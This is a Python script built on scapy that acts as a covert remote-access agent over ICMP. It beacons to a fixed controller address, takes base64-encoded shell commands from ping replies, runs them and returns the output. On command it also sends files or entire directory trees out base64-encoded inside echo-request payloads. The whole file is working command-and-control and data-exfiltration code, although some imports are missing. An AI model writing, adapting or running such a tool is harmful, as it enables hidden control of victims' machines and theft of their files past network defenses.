from scapy.all import *
import base64
import time
import os

destination = "192.168.18.1"
sniffInterface = "eth0"
delayToKeepAlive = 5
sendKeepAlive = True


def keepAlive():
    while(True):
        if (sendKeepAlive):
            print("[KeepAlive] Sending keep alive ... \n")
            sendMessage(destination, "keepAlive")
            time.sleep(delayToKeepAlive)


# @return ICMP message's bytes
def sniffMessage():
    while(True):
        a = sniff(iface=sniffInterface, filter="icmp", count=1)
        # 0 is echo-reply and only listen for those
        if a[0][2].fields.get("type") == 0:
            return a[0][3].fields.get("load")

# Send echo-request
def sendMessage(destination, string):
    p = sr1(IP(dst=destination)/ICMP(type=8, id=1, seq=1)/string, timeout=0)
    # timeout is set to 0 to prevent waiting on the reply (that could never come)

def isAdmin():
    try:
        is_admin = (os.getuid() == 0)
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return is_admin

def sendFile(fileName):
    fileToSend = open(fileName,"rb")
    binaryData = fileToSend.read()
    encoded = (base64.b64encode(binaryData)).decode('ascii')

    print("fileToSend: "+fileName)
    print("Encoded file: "+encoded)
    sendMessage(destination, fileName)
    sendMessage(destination, encoded)

def sendDirectory(path, isSubDirectory):
    print("Sending path : "+ path)
    for f in os.listdir(path):
        filePath = path + '/' + f
        print("filePath: "+filePath)
        if os.path.isfile(filePath):
            sendMessage(destination, "file")
            sendFile(filePath)
        else:
            sendMessage(destination, "directory")
            sendMessage(destination, filePath)

            sendDirectory(filePath, True)
        
        time.sleep(0.5)
    
    if not isSubDirectory:
    	sendMessage(destination, "end")

if __name__ == "__main__":

    if not isAdmin():
        print("The script must be run as Administrator or root")
        exit()

    keepAliveThread = Thread(target = keepAlive)
    keepAliveThread.start()
    
    while True:

        action = sniffMessage().decode("utf-8")
        print("Received action : '"+action+"'")

        if action == "file":
            sendKeepAlive = False

            fileName = sniffMessage().decode("utf-8")
            sendFile(fileName)

            sendKeepAlive = True

        elif action == "command":

            sendKeepAlive = False

            base64Command = sniffMessage().decode("utf-8")
            print("base64 command : "+base64Command)
            decodedCommand = base64.b64decode(base64Command).decode("utf-8")
            print("Decoded command : "+decodedCommand)

            result = subprocess.run(
                decodedCommand.split(),
                shell = True,
                capture_output = True, # Python >= 3.7 only
                text = True # Python >= 3.7 only
            )
            output = "stdout:\n"+result.stdout+"\n\nstderr:\n"+result.stderr
            print("command output: "+output)

            encodedOutput = base64.b64encode(output.encode('utf-8'))
            sendMessage(destination, encodedOutput)

            print("Finished sending command output")
            
            sendKeepAlive = True

        elif action == "message":
            print(sniffMessage().decode("utf-8"))

        elif action == "directory":
            sendKeepAlive = False

            directory = base64.b64decode(sniffMessage().decode("utf-8")).decode('utf-8')
            print("directory :"+ directory)
            sendDirectory(directory, False)

            sendKeepAlive = True
